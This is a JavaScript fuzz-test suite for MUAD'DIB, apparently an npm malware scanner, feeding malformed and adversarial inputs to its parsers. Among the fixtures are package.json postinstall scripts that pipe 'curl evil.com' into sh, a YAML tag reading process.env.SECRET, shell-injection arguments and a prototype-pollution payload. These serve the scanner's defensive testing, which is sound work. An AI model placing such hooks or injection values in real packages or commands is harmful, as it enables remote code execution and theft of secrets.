/**
 * MUAD'DIB Fuzz Tests
 * Tests parser robustness with malformed, adversarial, and edge-case inputs.
 * Every test verifies: no unhandled exception + coherent return value.
 */

const fs = require('fs');
const path = require('path');
const os = require('os');
const yaml = require('js-yaml');
const { execSync } = require('child_process');

// Modules under test
const { scanPackageJson } = require('../src/scanner/package.js');
const { analyzeAST } = require('../src/scanner/ast.js');
const { detectObfuscation } = require('../src/scanner/obfuscation.js');
const { scanTyposquatting } = require('../src/scanner/typosquat.js');
const { run } = require('../src/index.js');

const BIN = path.join(__dirname, '..', 'bin', 'muaddib.js');

let passed = 0;
let failed = 0;
const failures = [];

function test(name, fn) {
  try {
    const result = fn();
    if (result && typeof result.then === 'function') {
      return result.then(() => {
        console.log(`[PASS] ${name}`);
        passed++;
      }).catch(e => {
        console.log(`[FAIL] ${name}`);
        console.log(`       ${e.message}`);
        failures.push({ name, error: e.message });
        failed++;
      });
    }
    console.log(`[PASS] ${name}`);
    passed++;
    return Promise.resolve();
  } catch (e) {
    console.log(`[FAIL] ${name}`);
    console.log(`       ${e.message}`);
    failures.push({ name, error: e.message });
    failed++;
    return Promise.resolve();
  }
}

function assert(condition, message) {
  if (!condition) throw new Error(message || 'Assertion failed');
}

// -------------------------------------------------------
// Temp directory helpers
// -------------------------------------------------------
function makeTempDir(prefix) {
  return fs.mkdtempSync(path.join(os.tmpdir(), `muaddib-fuzz-${prefix}-`));
}

function cleanDir(dir) {
  try {
    fs.rmSync(dir, { recursive: true, force: true });
  } catch { /* ignore */ }
}

// -------------------------------------------------------
// 1. YAML LOADER FUZZ TESTS
// -------------------------------------------------------
async function yamlTests() {
  console.log('\n=== YAML LOADER FUZZ TESTS ===\n');

  await test('YAML: Invalid YAML does not crash yaml.load with JSON_SCHEMA', () => {
    const invalidYamls = [
      '{{{{not yaml at all!!!!',
      'key: [unbalanced',
      ':\n  :\n    :\n      bad',
      'tabs:\t\t\tbroken\n  mixed:\n\tindent',
      '---\n...\n---\n...\n---',
      'a: &anchor\n  b: *missing_anchor_xxxxx',
      '"unclosed string',
      'key: value\n  bad indent\n    worse indent',
    ];

    for (const input of invalidYamls) {
      try {
        yaml.load(input, { schema: yaml.JSON_SCHEMA });
      } catch (e) {
        // Expected: yaml.load throws YAMLException on invalid input
        assert(e.name === 'YAMLException' || e instanceof yaml.YAMLException || e instanceof Error,
          `Should throw YAMLException, got: ${e.constructor.name}`);
      }
    }
  });

  await test('YAML: !!js/function tag is blocked by JSON_SCHEMA', () => {
    const dangerous = `
malicious: !!js/function >
  function() { return process.env.SECRET; }
`;
    try {
      yaml.load(dangerous, { schema: yaml.JSON_SCHEMA });
      // If it doesn't throw, the tag should have been ignored
      assert(true, 'Tag was silently ignored (also acceptable)');
    } catch (e) {
      // Expected: JSON_SCHEMA rejects JS-specific tags
      assert(e.message.includes('unknown tag'),
        `Should reject !!js/function tag, got: ${e.message}`);
    }
  });

  await test('YAML: !!js/regexp tag is blocked by JSON_SCHEMA', () => {
    const dangerous = 'evil: !!js/regexp /./';
    try {
      yaml.load(dangerous, { schema: yaml.JSON_SCHEMA });
      assert(true, 'Tag ignored');
    } catch (e) {
      assert(e.message.includes('unknown tag'),
        `Should reject !!js/regexp, got: ${e.message}`);
    }
  });

  await test('YAML: !!js/undefined tag is blocked by JSON_SCHEMA', () => {
    const dangerous = 'val: !!js/undefined ""';
    try {
      yaml.load(dangerous, { schema: yaml.JSON_SCHEMA });
      assert(true, 'Tag ignored');
    } catch (e) {
      assert(e.message.includes('unknown tag'),
        `Should reject !!js/undefined, got: ${e.message}`);
    }
  });

  await test('YAML: Empty string returns null/undefined', () => {
    const result = yaml.load('', { schema: yaml.JSON_SCHEMA });
    assert(result === undefined || result === null,
      `Empty YAML should return null/undefined, got: ${typeof result}`);
  });

  await test('YAML: Whitespace-only returns null/undefined', () => {
    const result = yaml.load('   \n\n  \t\n  ', { schema: yaml.JSON_SCHEMA });
    assert(result === undefined || result === null,
      `Whitespace-only YAML should return null/undefined, got: ${typeof result}`);
  });

  await test('YAML: Large YAML (10MB string) does not crash', () => {
    // Build a ~10MB YAML document
    const lines = ['packages:'];
    const entry = '  - name: "pkg-XXXX"\n    version: "1.0.0"\n    severity: critical\n';
    const entrySize = Buffer.byteLength(entry);
    const count = Math.ceil((10 * 1024 * 1024) / entrySize);
    for (let i = 0; i < count; i++) {
      lines.push(entry.replace('XXXX', String(i)));
    }
    const bigYaml = lines.join('\n');
    assert(Buffer.byteLength(bigYaml) >= 10 * 1024 * 1024, 'Should be >= 10MB');

    const result = yaml.load(bigYaml, { schema: yaml.JSON_SCHEMA });
    assert(result && Array.isArray(result.packages), 'Should parse to an object with packages array');
    assert(result.packages.length === count, `Should have ${count} packages`);
  });

  await test('YAML: Unicode characters (emoji, CJK, RTL, ZWJ)', () => {
    const unicodeYaml = `
packages:
  - name: "\u{1F4A9}-package"
    version: "1.0.0"
  - name: "\u4E2D\u6587\u5305"
    version: "2.0.0"
  - name: "\u0627\u0644\u0639\u0631\u0628\u064A\u0629"
    version: "3.0.0"
  - name: "a\u200Db\u200Dc"
    version: "4.0.0"
`;
    const result = yaml.load(unicodeYaml, { schema: yaml.JSON_SCHEMA });
    assert(result && result.packages.length === 4, 'Should parse 4 packages with unicode names');
  });

  await test('YAML: Null bytes are correctly rejected by yaml.load', () => {
    const nullYaml = 'name: "test\u0000value"';
    let threw = false;
    try {
      yaml.load(nullYaml, { schema: yaml.JSON_SCHEMA });
    } catch (e) {
      threw = true;
      assert(e.message.includes('null byte'), `Should mention null byte, got: ${e.message}`);
    }
    assert(threw, 'Should throw on null bytes in YAML');
  });

  await test('YAML: Billion laughs (entity expansion) does not cause memory bomb', () => {
    // YAML doesn't have XML entities, but test anchor/alias expansion
    const yamlBomb = `
a: &a ["lol"]
b: &b [*a, *a, *a, *a, *a, *a, *a, *a, *a, *a]
c: &c [*b, *b, *b, *b, *b, *b, *b, *b, *b, *b]
d: &d [*c, *c, *c, *c, *c, *c, *c, *c, *c, *c]
`;
    const result = yaml.load(yamlBomb, { schema: yaml.JSON_SCHEMA });
    assert(result !== null && result !== undefined, 'Should parse without crashing');
  });

  await test('YAML: Document with only comments', () => {
    const result = yaml.load('# just a comment\n# another comment\n', { schema: yaml.JSON_SCHEMA });
    assert(result === undefined || result === null,
      'Comment-only YAML should return null/undefined');
  });

  await test('YAML: Deeply nested structure (100 levels)', () => {
    let yamlStr = 'root:\n';
    for (let i = 0; i < 100; i++) {
      yamlStr += ' '.repeat((i + 1) * 2) + `level${i}:\n`;
    }
    yamlStr += ' '.repeat(202) + 'value: "deep"';
    const result = yaml.load(yamlStr, { schema: yaml.JSON_SCHEMA });
    assert(result && result.root, 'Should parse deep nesting');
  });
}

// -------------------------------------------------------
// 2. JSON PARSER (package.json) FUZZ TESTS
// -------------------------------------------------------
async function jsonTests() {
  console.log('\n=== JSON PARSER (package.json) FUZZ TESTS ===\n');

  await test('JSON: Invalid JSON does not crash scanPackageJson', async () => {
    const dir = makeTempDir('json-invalid');
    try {
      fs.writeFileSync(path.join(dir, 'package.json'), '{{{not json!!!}}}}');
      const threats = await scanPackageJson(dir);
      assert(Array.isArray(threats), 'Should return an array');
      assert(threats.length === 0, 'Should return empty array for invalid JSON');
    } finally {
      cleanDir(dir);
    }
  });

  await test('JSON: Empty file does not crash scanPackageJson', async () => {
    const dir = makeTempDir('json-empty');
    try {
      fs.writeFileSync(path.join(dir, 'package.json'), '');
      const threats = await scanPackageJson(dir);
      assert(Array.isArray(threats), 'Should return an array');
    } finally {
      cleanDir(dir);
    }
  });

  await test('JSON: Empty object {} returns array', async () => {
    const dir = makeTempDir('json-emptyobj');
    try {
      fs.writeFileSync(path.join(dir, 'package.json'), '{}');
      const threats = await scanPackageJson(dir);
      assert(Array.isArray(threats), 'Should return an array');
      assert(threats.length === 0, 'Should return empty array for empty object');
    } finally {
      cleanDir(dir);
    }
  });

  await test('JSON: Keys of 10000 characters do not crash', async () => {
    const dir = makeTempDir('json-longkeys');
    try {
      const longKey = 'a'.repeat(10000);
      const pkg = {
        name: 'test',
        scripts: {},
        dependencies: {}
      };
      pkg.scripts[longKey] = 'echo hello';
      pkg.dependencies[longKey] = '1.0.0';
      fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify(pkg));
      const threats = await scanPackageJson(dir);
      assert(Array.isArray(threats), 'Should return an array');
    } finally {
      cleanDir(dir);
    }
  });

  await test('JSON: Values with null everywhere do not crash', async () => {
    const dir = makeTempDir('json-nulls');
    try {
      const pkg = {
        name: null,
        version: null,
        scripts: {
          preinstall: null,
          postinstall: null
        },
        dependencies: {
          lodash: null,
          express: null
        }
      };
      fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify(pkg));
      const threats = await scanPackageJson(dir);
      assert(Array.isArray(threats), 'Should return an array');
    } finally {
      cleanDir(dir);
    }
  });

  await test('JSON: Numeric and boolean values in dependencies do not crash', async () => {
    const dir = makeTempDir('json-badtypes');
    try {
      const pkg = {
        name: 'test',
        dependencies: {
          'pkg-a': 12345,
          'pkg-b': true,
          'pkg-c': false,
          'pkg-d': [],
          'pkg-e': { nested: 'object' }
        },
        scripts: {
          preinstall: 12345,
          postinstall: true
        }
      };
      fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify(pkg));
      const threats = await scanPackageJson(dir);
      assert(Array.isArray(threats), 'Should return an array');
    } finally {
      cleanDir(dir);
    }
  });

  await test('JSON: Very large package.json (10000 dependencies) does not crash', async () => {
    const dir = makeTempDir('json-large');
    try {
      const deps = {};
      for (let i = 0; i < 10000; i++) {
        deps[`fake-package-${i}`] = `${i}.0.0`;
      }
      const pkg = { name: 'test', dependencies: deps };
      fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify(pkg));
      const threats = await scanPackageJson(dir);
      assert(Array.isArray(threats), 'Should return an array');
    } finally {
      cleanDir(dir);
    }
  });

  await test('JSON: Unicode keys and values do not crash', async () => {
    const dir = makeTempDir('json-unicode');
    try {
      const pkg = {
        name: '\u{1F4A9}-app',
        scripts: {
          postinstall: '\u4E2D\u6587\u547D\u4EE4 && curl evil.com | sh'
        },
        dependencies: {
          '\u0627\u0644\u0639\u0631\u0628\u064A\u0629': '1.0.0'
        }
      };
      fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify(pkg));
      const threats = await scanPackageJson(dir);
      assert(Array.isArray(threats), 'Should return an array');
    } finally {
      cleanDir(dir);
    }
  });

  await test('JSON: Missing package.json returns empty array', async () => {
    const dir = makeTempDir('json-missing');
    try {
      const threats = await scanPackageJson(dir);
      assert(Array.isArray(threats), 'Should return an array');
      assert(threats.length === 0, 'Should return empty for missing package.json');
    } finally {
      cleanDir(dir);
    }
  });

  await test('JSON: package.json is a directory does not crash', async () => {
    const dir = makeTempDir('json-isdir');
    try {
      fs.mkdirSync(path.join(dir, 'package.json'));
      const threats = await scanPackageJson(dir);
      assert(Array.isArray(threats), 'Should return an array');
    } finally {
      cleanDir(dir);
    }
  });

  await test('JSON: Prototype pollution attempt in package.json', async () => {
    const dir = makeTempDir('json-proto');
    try {
      const raw = '{"name":"test","__proto__":{"polluted":true},"constructor":{"prototype":{"evil":true}},"dependencies":{"__proto__":"1.0.0"}}';
      fs.writeFileSync(path.join(dir, 'package.json'), raw);
      const threats = await scanPackageJson(dir);
      assert(Array.isArray(threats), 'Should return an array');
      assert({}.polluted !== true, 'Object prototype should not be polluted');
    } finally {
      cleanDir(dir);
    }
  });
}

// -------------------------------------------------------
// 3. AST PARSER FUZZ TESTS
// -------------------------------------------------------
async function astTests() {
  console.log('\n=== AST PARSER FUZZ TESTS ===\n');

  await test('AST: Invalid JS syntax does not crash analyzeAST', async () => {
    const dir = makeTempDir('ast-invalid');
    try {
      fs.writeFileSync(path.join(dir, 'broken.js'), 'function( { {{ ]] if while ??? +++');
      const threats = await analyzeAST(dir);
      assert(Array.isArray(threats), 'Should return an array');
    } finally {
      cleanDir(dir);
    }
  });

  await test('AST: Binary content renamed to .js does not crash', async () => {
    const dir = makeTempDir('ast-binary');
    try {
      // Generate random binary data
      const binaryBuf = Buffer.alloc(4096);
      for (let i = 0; i < binaryBuf.length; i++) {
        binaryBuf[i] = Math.floor(Math.random() * 256);
      }
      fs.writeFileSync(path.join(dir, 'binary.js'), binaryBuf);
      const threats = await analyzeAST(dir);
      assert(Array.isArray(threats), 'Should return an array');
    } finally {
      cleanDir(dir);
    }
  });

  await test('AST: Empty .js file does not crash', async () => {
    const dir = makeTempDir('ast-empty');
    try {
      fs.writeFileSync(path.join(dir, 'empty.js'), '');
      const threats = await analyzeAST(dir);
      assert(Array.isArray(threats), 'Should return an array');
    } finally {
      cleanDir(dir);
    }
  });

  await test('AST: File with only comments does not crash', async () => {
    const dir = makeTempDir('ast-comments');
    try {
      fs.writeFileSync(path.join(dir, 'comments.js'),
        '// This is a comment\n/* Block comment */\n/** JSDoc */\n// End');
      const threats = await analyzeAST(dir);
      assert(Array.isArray(threats), 'Should return an array');
      assert(threats.length === 0, 'Comments-only file should have no threats');
    } finally {
      cleanDir(dir);
    }
  });

  await test('AST: File with null bytes does not crash', async () => {
    const dir = makeTempDir('ast-null');
    try {
      fs.writeFileSync(path.join(dir, 'nullbytes.js'),
        'var x = "hello\x00world";\nvar y = \x00;\nconsole.log(\x00);');
      const threats = await analyzeAST(dir);
      assert(Array.isArray(threats), 'Should return an array');
    } finally {
      cleanDir(dir);
    }
  });

  await test('AST: File with only shebang does not crash', async () => {
    const dir = makeTempDir('ast-shebang');
    try {
      fs.writeFileSync(path.join(dir, 'shebang.js'), '#!/usr/bin/env node\n');
      const threats = await analyzeAST(dir);
      assert(Array.isArray(threats), 'Should return an array');
    } finally {
      cleanDir(dir);
    }
  });

  await test('AST: Deeply nested callbacks (100 levels) do not crash', async () => {
    const dir = makeTempDir('ast-deep');
    try {
      let code = '';
      for (let i = 0; i < 100; i++) code += `(function f${i}() {\n`;
      code += 'var x = 1;\n';
      for (let i = 0; i < 100; i++) code += '})();\n';
      fs.writeFileSync(path.join(dir, 'deep.js'), code);
      const threats = await analyzeAST(dir);
      assert(Array.isArray(threats), 'Should return an array');
    } finally {
      cleanDir(dir);
    }
  });

  await test('AST: Extremely long single line (500KB) does not crash', async () => {
    const dir = makeTempDir('ast-longline');
    try {
      const longLine = 'var x = "' + 'A'.repeat(500000) + '";';
      fs.writeFileSync(path.join(dir, 'longline.js'), longLine);
      const threats = await analyzeAST(dir);
      assert(Array.isArray(threats), 'Should return an array');
    } finally {
      cleanDir(dir);
    }
  });

  await test('AST: File with BOM marker does not crash', async () => {
    const dir = makeTempDir('ast-bom');
    try {
      fs.writeFileSync(path.join(dir, 'bom.js'), '\uFEFFvar x = 1;\n');
      const threats = await analyzeAST(dir);
      assert(Array.isArray(threats), 'Should return an array');
    } finally {
      cleanDir(dir);
    }
  });

  await test('AST: Mixed encodings in string literals do not crash', async () => {
    const dir = makeTempDir('ast-encoding');
    try {
      const code = `
var a = "\\u0048\\u0065\\u006C\\u006C\\u006F";
var b = "\\x48\\x65\\x6C\\x6C\\x6F";
var c = "\u{1F4A9}";
var d = "\\0\\a\\b\\f\\n\\r\\t\\v";
var e = "\u200B\u200C\u200D\uFEFF";
`;
      fs.writeFileSync(path.join(dir, 'encoding.js'), code);
      const threats = await analyzeAST(dir);
      assert(Array.isArray(threats), 'Should return an array');
    } finally {
      cleanDir(dir);
    }
  });

  await test('AST: No .js files in directory returns empty array', async () => {
    const dir = makeTempDir('ast-nojs');
    try {
      fs.writeFileSync(path.join(dir, 'readme.txt'), 'hello');
      fs.writeFileSync(path.join(dir, 'data.json'), '{}');
      const threats = await analyzeAST(dir);
      assert(Array.isArray(threats), 'Should return an array');
      assert(threats.length === 0, 'No JS files should produce no threats');
    } finally {
      cleanDir(dir);
    }
  });
}

// -------------------------------------------------------
// 4. OBFUSCATION DETECTOR FUZZ TESTS
// -------------------------------------------------------
async function obfuscationTests() {
  console.log('\n=== OBFUSCATION DETECTOR FUZZ TESTS ===\n');

  await test('OBF: File with 10000 hex escapes does not crash', () => {
    const dir = makeTempDir('obf-hex');
    try {
      const hexContent = 'var s = "' + '\\x41'.repeat(10000) + '";';
      fs.writeFileSync(path.join(dir, 'hexheavy.js'), hexContent);
      const threats = detectObfuscation(dir);
      assert(Array.isArray(threats), 'Should return an array');
    } finally {
      cleanDir(dir);
    }
  });

  await test('OBF: Regex backtracking input (ReDoS attempt) does not hang', () => {
    const dir = makeTempDir('obf-redos');
    try {
      // Craft input designed to trigger backtracking on the string_array regex:
      // /var\s+\w+\s*=\s*\[(['"][^'"]{0,50}['"],?\s*){10,}\]/
      const payload = 'var arr = [' + '"a",'.repeat(100) + '"z"';
      // NOTE: no closing ] to maximize backtracking
      fs.writeFileSync(path.join(dir, 'redos.js'), payload);

      const start = Date.now();
      const threats = detectObfuscation(dir);
      const elapsed = Date.now() - start;
      assert(Array.isArray(threats), 'Should return an array');
      assert(elapsed < 10000, `Should complete within 10s, took ${elapsed}ms`);
    } finally {
      cleanDir(dir);
    }
  });

  await test('OBF: File with mixed obfuscation signals does not crash', () => {
    const dir = makeTempDir('obf-mixed');
    try {
      const content = [
        'var _0xabc1 = "test"; var _0xabc2 = "test"; var _0xabc3 = "test";',
        'var _0xabc4 = "test"; var _0xabc5 = "test"; var _0xabc6 = "test";',
        'var s = "\\x48\\x65\\x6C\\x6C\\x6F\\x48\\x65\\x6C\\x6C\\x6F\\x48\\x65\\x6C\\x6C\\x6F\\x48\\x65\\x6C\\x6C\\x6F\\x48\\x65\\x6C\\x6C\\x6F";',
        'var u = "\\u0048\\u0065\\u006C\\u006C\\u006F\\u0048\\u0065\\u006C\\u006C\\u006F\\u0048\\u0065\\u006C\\u006C\\u006F\\u0048\\u0065\\u006C\\u006C\\u006F\\u0048\\u0065\\u006C\\u006C\\u006F";',
        'eval(atob("aGVsbG8="));'
      ].join('\n');
      fs.writeFileSync(path.join(dir, 'mixed.js'), content);
      const threats = detectObfuscation(dir);
      assert(Array.isArray(threats), 'Should return an array');
    } finally {
      cleanDir(dir);
    }
  });
}

// -------------------------------------------------------
// 5. TYPOSQUAT FUZZ TESTS
// -------------------------------------------------------
async function typosquatTests() {
  console.log('\n=== TYPOSQUAT FUZZ TESTS ===\n');

  await test('TYPO: 10000 dependencies does not crash', async () => {
    const dir = makeTempDir('typo-large');
    try {
      const deps = {};
      for (let i = 0; i < 10000; i++) {
        deps[`random-pkg-name-${i}-${Math.random().toString(36).slice(2)}`] = '1.0.0';
      }
      fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ dependencies: deps }));
      const threats = await scanTyposquatting(dir);
      assert(Array.isArray(threats), 'Should return an array');
    } finally {
      cleanDir(dir);
    }
  });

  await test('TYPO: Unicode package names do not crash', async () => {
    const dir = makeTempDir('typo-unicode');
    try {
      const pkg = {
        dependencies: {
          '\u{1F4A9}': '1.0.0',
          '\u4E2D\u6587': '1.0.0',
          'l\u00F8dash': '1.0.0',     // lodash with ø
          'expr\u00E8ss': '1.0.0',    // express with è
          '\u0435xpress': '1.0.0',    // express with cyrillic e (homoglyph)
        }
      };
      fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify(pkg));
      const threats = await scanTyposquatting(dir);
      assert(Array.isArray(threats), 'Should return an array');
    } finally {
      cleanDir(dir);
    }
  });

  await test('TYPO: Very long package names (10000 chars) do not crash', async () => {
    const dir = makeTempDir('typo-longname');
    try {
      const pkg = {
        dependencies: {
          ['a'.repeat(10000)]: '1.0.0',
          ['lodash' + 'x'.repeat(9994)]: '1.0.0',
        }
      };
      fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify(pkg));
      const start = Date.now();
      const threats = await scanTyposquatting(dir);
      const elapsed = Date.now() - start;
      assert(Array.isArray(threats), 'Should return an array');
      assert(elapsed < 10000, `Should complete within 10s, took ${elapsed}ms`);
    } finally {
      cleanDir(dir);
    }
  });

  await test('TYPO: Empty dependency names do not crash', async () => {
    const dir = makeTempDir('typo-empty');
    try {
      const pkg = { dependencies: { '': '1.0.0', ' ': '1.0.0', '-': '1.0.0' } };
      fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify(pkg));
      const threats = await scanTyposquatting(dir);
      assert(Array.isArray(threats), 'Should return an array');
    } finally {
      cleanDir(dir);
    }
  });
}

// -------------------------------------------------------
// 6. CLI ARGUMENT PARSER FUZZ TESTS
// -------------------------------------------------------
async function cliTests() {
  console.log('\n=== CLI ARGUMENT PARSER FUZZ TESTS ===\n');

  function runCLI(args) {
    try {
      return execSync(`node "${BIN}" ${args}`, {
        encoding: 'utf8',
        stdio: ['pipe', 'pipe', 'pipe'],
        timeout: 30000
      });
    } catch (e) {
      return (e.stdout || '') + (e.stderr || '');
    }
  }

  await test('CLI: Argument of 10000 characters does not crash', () => {
    const longArg = 'a'.repeat(10000);
    const output = runCLI(`scan "${longArg}"`);
    assert(typeof output === 'string', 'Should return string output');
  });

  await test('CLI: Non-existent path returns gracefully', () => {
    const output = runCLI('scan "/nonexistent/path/that/does/not/exist/12345"');
    assert(typeof output === 'string', 'Should return string output');
  });

  await test('CLI: Path with spaces does not crash', () => {
    const dir = makeTempDir('cli spaces test');
    try {
      fs.writeFileSync(path.join(dir, 'package.json'), '{"name":"test"}');
      const output = runCLI(`scan "${dir}"`);
      assert(typeof output === 'string', 'Should return string output');
    } finally {
      cleanDir(dir);
    }
  });

  await test('CLI: Path with unicode characters does not crash', () => {
    const baseDir = makeTempDir('cli-unicode');
    const unicodeDir = path.join(baseDir, '\u00E9\u00E0\u00FC\u00F1');
    try {
      fs.mkdirSync(unicodeDir);
      fs.writeFileSync(path.join(unicodeDir, 'package.json'), '{"name":"test"}');
      const output = runCLI(`scan "${unicodeDir}"`);
      assert(typeof output === 'string', 'Should return string output');
    } finally {
      cleanDir(baseDir);
    }
  });

  await test('CLI: Unknown command returns error message', () => {
    const output = runCLI('notarealcommand');
    assert(output.includes('Unknown command'), 'Should show unknown command message');
  });

  await test('CLI: --json flag with non-existent path returns valid JSON', () => {
    const output = runCLI('scan "/does/not/exist" --json');
    assert(typeof output === 'string', 'Should return string output');
    // If there is JSON output, verify it is valid
    const trimmed = output.trim();
    if (trimmed.startsWith('{') || trimmed.startsWith('[')) {
      JSON.parse(trimmed); // Should not throw
    }
  });

  await test('CLI: Empty scan target (.) does not crash', () => {
    const dir = makeTempDir('cli-empty');
    try {
      const output = runCLI(`scan "${dir}"`);
      assert(typeof output === 'string', 'Should return string output');
    } finally {
      cleanDir(dir);
    }
  });

  await test('CLI: Multiple conflicting flags do not crash', () => {
    const output = runCLI('scan . --json --html out.html --sarif out.sarif --paranoid --explain --fail-on low');
    assert(typeof output === 'string', 'Should return string output');
  });

  await test('CLI: --fail-on with invalid level does not crash', () => {
    const dir = makeTempDir('cli-badlevel');
    try {
      fs.writeFileSync(path.join(dir, 'package.json'), '{"name":"test"}');
      const output = runCLI(`scan "${dir}" --fail-on notavalidlevel`);
      assert(typeof output === 'string', 'Should return string output');
    } finally {
      cleanDir(dir);
    }
  });

  await test('CLI: Special shell characters in arguments do not cause injection', () => {
    const output = runCLI('scan "$(echo pwned)" --fail-on "$(whoami)"');
    assert(typeof output === 'string', 'Should return string output');
    // The path should be treated as literal, not executed
  });

  await test('CLI: help command returns help text', () => {
    const output = runCLI('help');
    assert(output.includes('MUAD'), 'Should contain MUAD in help');
    assert(output.includes('scan'), 'Should mention scan command');
  });
}

// -------------------------------------------------------
// 7. FULL PIPELINE FUZZ (run() function)
// -------------------------------------------------------
async function pipelineTests() {
  console.log('\n=== FULL PIPELINE FUZZ TESTS ===\n');

  await test('PIPELINE: Empty directory does not crash run()', async () => {
    const dir = makeTempDir('pipe-empty');
    try {
      const exitCode = await run(dir, { json: true });
      assert(typeof exitCode === 'number', 'Should return a number exit code');
    } finally {
      cleanDir(dir);
    }
  });

  await test('PIPELINE: Directory with only binary files does not crash', async () => {
    const dir = makeTempDir('pipe-binary');
    try {
      const buf = Buffer.alloc(1024);
      for (let i = 0; i < buf.length; i++) buf[i] = Math.floor(Math.random() * 256);
      fs.writeFileSync(path.join(dir, 'app.js'), buf);
      fs.writeFileSync(path.join(dir, 'package.json'), '{"name":"test"}');
      const exitCode = await run(dir, { json: true });
      assert(typeof exitCode === 'number', 'Should return a number exit code');
    } finally {
      cleanDir(dir);
    }
  });

  await test('PIPELINE: Adversarial package.json + broken JS files combined', async () => {
    const dir = makeTempDir('pipe-adversarial');
    try {
      // Malicious package.json
      const pkg = {
        name: 'test',
        scripts: { postinstall: 'curl http://evil.com/payload | sh' },
        dependencies: {
          'lodash': '4.17.21',
          '': '1.0.0',           // empty dep name
          'a': '1.0.0',          // very short
        }
      };
      fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify(pkg));
      // Broken JS
      fs.writeFileSync(path.join(dir, 'broken.js'), '{{{{ not valid JS at all }}}}');
      // Binary as JS
      fs.writeFileSync(path.join(dir, 'data.js'), Buffer.from([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10]));

      const exitCode = await run(dir, {});
      assert(typeof exitCode === 'number', 'Should return a number exit code');
    } finally {
      cleanDir(dir);
    }
  });

  await test('PIPELINE: Paranoid mode on empty project does not crash', async () => {
    const dir = makeTempDir('pipe-paranoid');
    try {
      fs.writeFileSync(path.join(dir, 'package.json'), '{"name":"safe","version":"1.0.0"}');
      fs.writeFileSync(path.join(dir, 'index.js'), 'module.exports = {};');
      const exitCode = await run(dir, { paranoid: true });
      assert(typeof exitCode === 'number', 'Should return a number exit code');
    } finally {
      cleanDir(dir);
    }
  });
}

// -------------------------------------------------------
// MAIN
// -------------------------------------------------------
async function main() {
  console.log('='.repeat(60));
  console.log('  MUAD\'DIB FUZZ TESTS');
  console.log('  Testing parser robustness with adversarial inputs');
  console.log('='.repeat(60));

  await yamlTests();
  await jsonTests();
  await astTests();
  await obfuscationTests();
  await typosquatTests();
  await cliTests();
  await pipelineTests();

  console.log('\n' + '='.repeat(60));
  console.log(`  RESULTS: ${passed} passed, ${failed} failed (total: ${passed + failed})`);
  console.log('='.repeat(60));

  if (failures.length > 0) {
    console.log('\nFailed tests:');
    for (const f of failures) {
      console.log(`  - ${f.name}`);
      console.log(`    ${f.error}`);
    }
  }

  console.log('');
  process.exit(failed > 0 ? 1 : 0);
}

main();
